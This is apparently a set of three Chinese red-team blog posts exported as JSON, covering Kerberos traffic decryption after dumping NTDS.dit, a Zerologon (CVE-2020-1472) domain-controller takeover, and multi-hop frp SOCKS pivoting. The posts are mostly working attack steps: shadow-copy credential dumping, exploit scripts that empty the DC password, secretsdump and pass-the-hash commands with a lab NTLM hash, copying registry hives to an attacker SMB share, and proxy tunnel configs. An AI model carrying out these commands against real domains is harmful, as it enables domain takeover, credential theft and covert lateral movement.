[{"title":"解密Wireshark Kerberos协议","url":"/2022/11/07/解密Wireshark-Kerberos协议/","content":"\n### #1 原始报文\n\n![image-20220908162617609](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png)\n\n\n\n### #2 域控导出NTDS.dit和SYSTEM文件\n\n```bash\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\system.hive\nvssadmin delete shadows /all\n```\n\n![image-20220908162947619](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png)\n\n\n\n### #3 kali安装 libesedb-utils\n\n```\nsudo apt install libesedb-utils\n```\n\n\n\n### #4 git 克隆 ntdsxtract\n\n```bash\ngit clone https://github.com/csababarta/ntdsxtract.git\n```\n\n![image-20220908164711048](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png)\n\n\n\n### #5 python2 安装 pycryptodome\n\n```\npython2 -m pip install pycryptodome\n```\n\n![image-20220908163452363](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png)\n\n\n\n### #6 提取出多个文件，在ntds.dit.export目录下  **(这个步骤等待的时间较长)**\n\n![image-20220908163632883](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png)\n\n![image-20220908164504631](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png)\n\n\n\n### #7 提取出 keytab文件\n\n![image-20220908164816450](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png)\n\n\n\n### #8 Wireshark 导入keytab文件  编辑->首选项->Protocols->KRB5\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png\" alt=\"image-20220908164946014\" style=\"zoom:33%;\" />\n\n\n\n### #9 解密enc-part部分，就能看到 Login session key。\n\n![image-20220908165522558](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png)\n\n","tags":["Kerberos","Wireshark"]},{"title":"CVE-2020-1472 Netlogon权限提升","url":"/2022/11/07/CVE-2020-1472-Netlogon权限提升/","content":"\n### # 0x00 目录\n\n1. 漏洞分析\n2. 漏洞利用条件\n3. 漏洞利用\n\n***\n\n### # 0x01 漏洞分析\n\n攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。\n\n影响版本\n\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\n* Windows Server 2012\n* Windows Server 2012 (Server Core installation)\n* Windows Server 2012 R2\n* Windows Server 2012 R2 (Server Core installation)\n* Windows Server 2016\n* Windows Server 2016 (Server Core installation)\n* Windows Server 2019\n* Windows Server 2019 (Server Core installation)\n* Windows Server, version 1903 (Server Core installation)\n* Windows Server, version 1909 (Server Core installation)\n* Windows Server, version 2004 (Server Core installation)\n\n***\n\n### # 0x02 漏洞利用条件\n\n1. 与域控通讯（在不在域内都行）\n2. 能访问域控MS-NRPC服务，\n\n当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。\n\n要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。\n\n***\n\n### # 0x03 复现工具\n\n漏洞验证工具：[https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py](https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py)\n\n漏洞利用工具：https://github.com/risksense/zerologon/blob/master/set_empty_pw.py\n\n密码重置工具：[https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py](https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py)\n\n### # 0x04 漏洞复现\n\n#### 0). 漏洞验证脚本\n\n获取dc主机名\n\n```\nWindows：nbtstat -A 10.10.10.8\nLinux：nbtscan\n```\n\n\n\n漏洞验证工具：zerologon_tester.py\n\n```\npython3 zerologon_tester.py OWA 10.10.10.8\n```\n\n![image-20220810131156397](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png)\n\n\n\n#### 1).  更改dc密码为空\n\n利用set_empty_pw.py将dc密码设置为空，即`31d6cfe0d16ae931b73c59d7e0c089c0`在利用secretsdump.py读dc的hash\n\n```\npython3 set_empty_pw.py OWA 10.10.10.8  #OWA为域控主机名\nimpacket-secretsdump redteam.red/OWA\\$@10.10.10.8 -no-pass\n```\n\n![image-20220810133549444](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png)\n\n获取到域管理员administrator用户hash：redteam.red\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::\n\n![image-20220810152925651](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png)\n\npth登录\n\n```\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810162528929](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png)\n\n**因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复**。\n\n\n\n#### 2).  还原密码\n\n#### #1 第一种方法\n\n密码还原工具restorepassword.py：https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py\n\n利用plain_password_hex\n\n![image-20220810143125888](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png)\n\n用restorepassword.py将密码还原，还原后利用空口令登录失败\n\n```bash\npython3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567\n```\n\n![image-20220810143023360](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png)\n\n\n\n#### #2 第二种方法\n\n从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码\n\n利用redteam.red/administrator hash登录\n\n```bash\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810153151365](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png)\n\n读取sam、system、security文件\n\n```\nreg save hklm\\sam sam.hive\nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\n```\n\n![image-20220810153451987](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png)\n\n通过SMB share复制回攻击机\n\n```\nC:\\>copy sam.hive \\\\10.10.10.128\\share\\sam.hive\n已复制         1 个文件。\n\nC:\\>copy security.hive \\\\10.10.10.128\\share\\security.hive\n已复制         1 个文件。\n\nC:\\>copy system.hive \\\\10.10.10.128\\share\\system.hive\n已复制         1 个文件。\n\nC:\\>exit\n```\n\n![image-20220810153845364](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png)\n\n或者利用impacket-smbclient链接到smb将文件下载到本地。\n\n```\nimpacket-smbclient redteam.red/administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4\n# use c$\n# ls\n# get sam.hive\n# get security.hive\n# get system.hive\n# exit\n```\n\n![image-20220810154730324](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png)\n\n\n\n利用secretsdump 读取到hash\n\n```\nimpacket-secretsdump -sam sam.hive  -system system.hive  -security security.hive LOCAL\n```\n\n![image-20220810160422687](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png)\n\n利用reinstall_original_pw.py将密码恢复。\n\n```\npython3 reinstall_original_pw.py owa 10.10.10.8 4e4890dbf2da33f3ce4087f5dd6a4dba\n```\n\n![image-20220810160619182](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png)\n","tags":["CVE-2020-1472"]},{"title":"frp之一层网络代理 / 二层网络代理 / 三层网络代理","url":"/2022/11/04/frp之一层网络代理  二层网络代理  三层网络代理/","content":"\n# frp之一层网络代理 / 二层网络代理 / 三层网络代理\n\n\n\n![image-20221103155324246](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png)\n\n\n\n### # 一层网络代理\n\n获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。\n\n1. 使用VPS作为FRP服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 用Windows Server 2012作为客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5]\nremote_port = 1080             # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n3. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n4. 命令前加上proxychains4\n\n```bash\nproxychinas4 ssh root@10.10.10.15\n```\n\n****\n\n\n\n### # 二层网络代理\n\n经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上起一个frp客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在DMZ区的10.10.10.15 Ubuntu上执行\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5]\ntype = tcp\nremote_port = 10808            # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n5. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n6. 命令前加上proxychains4\n\n```bash\nproxychinas4 rdesktop 192.168.30.20\n```\n\n***\n\n\n\n### # 三层网络代理\n\n通过代理访问到核心区的**192.168.60.10域控制器**\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在VPS上的FRP服务端上绑定的IP地址\nbind_port = 7000       # 在VPS上的FRP服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上执行以下命令：\n\n启动frp客户端，将本地端口10808转发到VPS的1080端口。\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# 客户端配置文件frpc.ini的内容如下\n[common]\nserver_addr = 192.168.2.200    # 指向VPS上frp服务端绑定的ip地址\nserver_port = 7000             # 指向VPS上frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在**DMZ区**的10.10.10.15 Ubuntu上执行，启动一个客户端\n\n启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 192.168.30.40       # 本地监听的IP地址\nlocal_port = 10809             # 要转发的本地端口\nremote_port = 10808            # 要转发到的远程端口\n```\n\n5. 在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 192.168.30.40      # 指定frp服务器端ip地址\nbind_port = 7000               # 指定frp服务端绑定端口\n```\n\n6. 在办公区的文件服务器上执行\n\n启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.30.40    # 指向Ubantu服务器上的 frp 服务端IP地址\nserver_port = 7000             # 指向Ubantu服务器上的 frp 服务端端口\n[socks5]\ntype = tcp\nremote_port = 10809            # 代理所用的端口，会被转发到服务器\nplugin = socks5                # 代理类型\n```\n\n7. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n8. 命令前加上proxychains4\n\n```\nproxychinas4 rdesktop 192.168.60.10\n```\n\n \n\n参考：《内网渗透体系建设》\n","tags":["内网","代理","frp"]}]